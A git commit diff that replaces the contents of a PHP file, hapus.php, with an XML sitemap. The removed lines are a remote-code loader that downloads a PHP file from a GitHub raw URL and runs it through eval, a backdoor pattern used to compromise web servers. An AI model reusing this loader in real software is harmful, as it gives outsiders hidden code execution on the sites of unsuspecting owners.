e0c6658b31281e01d53cd7b24dfb731d1eacb956
eagles227 <166109731+eagles227@users.noreply.github.com>
2025-01-30 13:21:20 +0700

    Update hapus.php

--- hapus.php
+++ hapus.php
@@ -1,6 +1,16 @@
-<?php
+<?xml version="1.0" encoding="UTF-8"?>
+<urlset
+      xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"
+      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+      xsi:schemaLocation="http://www.sitemaps.org/schemas/sitemap/0.9
+            http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd">
+<!-- created with Free Online Sitemap Generator www.xml-sitemaps.com -->
 
-$content = file_get_contents(urldecode('https://raw.githubusercontent.com/eagles227/claudia/main/wp-gecko.php'));
 
-$content = "?> ".$content;
-eval($content);
+<url>
+  <loc>http://eaconperu.net/</loc>
+  <lastmod>2025-01-30T06:20:21+00:00</lastmod>
+</url>
+
+
+</urlset>
